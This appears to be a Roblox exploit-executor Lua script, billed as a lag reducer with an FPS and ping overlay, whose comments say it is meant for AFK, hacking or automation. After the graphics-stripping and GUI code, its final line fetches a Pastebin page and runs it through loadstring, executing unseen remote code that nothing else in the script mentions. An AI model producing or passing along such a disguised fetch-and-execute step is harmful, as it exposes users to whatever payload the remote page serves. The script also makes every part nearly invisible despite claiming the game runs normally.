--------------------------------------------------------------------
------------------------[ LAG REDUCER SCRIPT ]-----------------------
--// ⚙️ LagFix Auto (No GUI) — by PhanGiaHuy x GPT-5
-- khi chạy script này => toàn bộ đồ họa sẽ bị tắt gần như hoàn toàn
-- game vẫn hoạt động bình thường, dùng để treo / hack / auto nhẹ FPS cao nhất

local Lighting = game:GetService("Lighting")

-- tắt hiệu ứng ánh sáng
pcall(function()
	Lighting.GlobalShadows = false
	Lighting.Brightness = 0
	Lighting.FogEnd = 9e9
	Lighting.FogStart = 0
	Lighting.ClockTime = 12
	Lighting.Ambient = Color3.new(1,1,1)
	Lighting.OutdoorAmbient = Color3.new(1,1,1)
	for _,v in ipairs(Lighting:GetChildren()) do
		if v:IsA("Sky") or v:IsA("Atmosphere") or v:IsA("BloomEffect") or v:IsA("ColorCorrectionEffect")
		or v:IsA("SunRaysEffect") or v:IsA("DepthOfFieldEffect") or v:IsA("BlurEffect") then
			v:Destroy()
		end
	end
end)

-- tắt toàn bộ texture, decal, effect, particle
for _,v in ipairs(game:GetDescendants()) do
	pcall(function()
		if v:IsA("BasePart") then
			v.Material = Enum.Material.Plastic
			v.Reflectance = 0
			v.CastShadow = false
			v.LocalTransparencyModifier = 1 -- gần như vô hình
		elseif v:IsA("Decal") or v:IsA("Texture") then
			v.Transparency = 1
		elseif v:IsA("ParticleEmitter") or v:IsA("Trail") or v:IsA("Beam")
			or v:IsA("Smoke") or v:IsA("Fire") or v:IsA("Sparkles") then
			v.Enabled = false
		end
	end)
end

-- tắt hiệu ứng GUI blur hoặc effect khác nếu có
pcall(function()
	game:GetService("StarterGui"):SetCore("TopbarEnabled", true)
end)

-- tiếp tục theo dõi đối tượng mới để tự động làm mờ
game.DescendantAdded:Connect(function(v)
	pcall(function()
		if v:IsA("BasePart") then
			v.Material = Enum.Material.Plastic
			v.Reflectance = 0
			v.CastShadow = false
			v.LocalTransparencyModifier = 1
		elseif v:IsA("Decal") or v:IsA("Texture") then
			v.Transparency = 1
		elseif v:IsA("ParticleEmitter") or v:IsA("Trail") or v:IsA("Beam")
			or v:IsA("Smoke") or v:IsA("Fire") or v:IsA("Sparkles") then
			v.Enabled = false
		end
	end)
end)

print("[✅] LagFix Auto: Graphics fully disabled. FPS Boosted to max.")
--------------------------------------------------------------------
--------------------------[ FPS + PING GUI KÍNH ]--------------------
--// Dynamic Island Hover + Soft Shadow — by PhanGiaHuy x GPT-5 🍎
local player = game.Players.LocalPlayer
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")

--== GUI setup ==
local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
gui.Name = "DynamicIslandHover"
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true

--== Soft shadow frame ==
local shadow = Instance.new("Frame", gui)
shadow.AnchorPoint = Vector2.new(0.5, 0)
shadow.Position = UDim2.new(0.5, 0, 0.02, 6)
shadow.Size = UDim2.new(0, 90, 0, 24)
shadow.BackgroundTransparency = 1

local shadowGradient = Instance.new("UIGradient", shadow)
shadowGradient.Color = ColorSequence.new{
	ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 0)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 0, 0))
}
shadowGradient.Transparency = NumberSequence.new{
	NumberSequenceKeypoint.new(0, 0.85),
	NumberSequenceKeypoint.new(0.4, 0.95),
	NumberSequenceKeypoint.new(1, 1)
}
shadowGradient.Rotation = 90

local shadowCorner = Instance.new("UICorner", shadow)
shadowCorner.CornerRadius = UDim.new(1, 0)

--== Main Island ==
local island = Instance.new("Frame", gui)
island.AnchorPoint = Vector2.new(0.5, 0)
island.Position = UDim2.new(0.5, 0, 0.02, 0)
island.Size = UDim2.new(0, 80, 0, 18)
island.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
island.BackgroundTransparency = 0.5
island.BorderSizePixel = 0
island.ClipsDescendants = true
island.ZIndex = 2

local corner = Instance.new("UICorner", island)
corner.CornerRadius = UDim.new(1, 0)

--== Inner glass ==
local glass = Instance.new("Frame", island)
glass.Size = UDim2.new(1, 0, 1, 0)
glass.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
glass.BackgroundTransparency = 0.3
glass.BorderSizePixel = 0
local gcorner = Instance.new("UICorner", glass)
gcorner.CornerRadius = UDim.new(1, 0)
local ggrad = Instance.new("UIGradient", glass)
ggrad.Color = ColorSequence.new{
	ColorSequenceKeypoint.new(0, Color3.fromRGB(230, 230, 230)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(200, 200, 200))
}
ggrad.Rotation = 45

--== Border stroke ==
local stroke = Instance.new("UIStroke", island)
stroke.Thickness = 1.2
stroke.Color = Color3.fromRGB(255, 255, 255)
stroke.Transparency = 0.6
stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

--== Text ==
local label = Instance.new("TextLabel", island)
label.Size = UDim2.new(1, -20, 1, 0)
label.Position = UDim2.new(0, 10, 0, 0)
label.BackgroundTransparency = 1
label.Text = "Ping: ... | FPS: ..."
label.TextColor3 = Color3.fromRGB(255, 255, 255)
label.TextStrokeTransparency = 0.3
label.TextSize = 22
label.Font = Enum.Font.GothamBold
label.TextTransparency = 1
label.ZIndex = 3

local glow = label:Clone()
glow.Parent = island
glow.TextTransparency = 1
glow.TextStrokeTransparency = 1
glow.ZIndex = 2

--== FPS + Ping ==
local fps, ping = 0, 0
RunService.RenderStepped:Connect(function() fps += 1 end)

task.spawn(function()
	while task.wait(1) do
		local ok, _ = pcall(function()
			ping = math.floor(player:GetNetworkPing() * 1000)
		end)
		label.Text = "Ping: "..ping.." ms | FPS: "..fps
		glow.Text = label.Text
		fps = 0
	end
end)

--== Hover anim ==
local hovering = false
local function showIsland()
	if hovering then return end
	hovering = true
	TweenService:Create(island, TweenInfo.new(0.5, Enum.EasingStyle.Elastic, Enum.EasingDirection.Out), {
		Size = UDim2.new(0, 230, 0, 48),
		BackgroundTransparency = 0.1
	}):Play()
	TweenService:Create(glass, TweenInfo.new(0.4), {BackgroundTransparency = 0.7}):Play()
	TweenService:Create(label, TweenInfo.new(0.3), {TextTransparency = 0}):Play()
	TweenService:Create(glow, TweenInfo.new(0.3), {TextTransparency = 0.5}):Play()
	TweenService:Create(shadow, TweenInfo.new(0.4), {Size = UDim2.new(0, 240, 0, 50)}):Play()
end

local function hideIsland()
	if not hovering then return end
	hovering = false
	TweenService:Create(island, TweenInfo.new(0.4, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
		Size = UDim2.new(0, 80, 0, 18),
		BackgroundTransparency = 0.5
	}):Play()
	TweenService:Create(glass, TweenInfo.new(0.4), {BackgroundTransparency = 0.3}):Play()
	TweenService:Create(label, TweenInfo.new(0.3), {TextTransparency = 1}):Play()
	TweenService:Create(glow, TweenInfo.new(0.3), {TextTransparency = 1}):Play()
	TweenService:Create(shadow, TweenInfo.new(0.4), {Size = UDim2.new(0, 90, 0, 24)}):Play()
end

--== Hover detection ==
local mouse = player:GetMouse()
RunService.Heartbeat:Connect(function()
	local pos = Vector2.new(mouse.X, mouse.Y)
	local guiPos = island.AbsolutePosition
	local guiSize = island.AbsoluteSize
	local center = guiPos + guiSize / 2
	local dist = (pos - center).Magnitude
	if dist < 120 then showIsland() else hideIsland() end
end)
--------------------------------------------------------------------
loadstring(game:HttpGet("https://pastebin.com/raw/KiSYpej6",true))()
--------------------------------------------------------------------

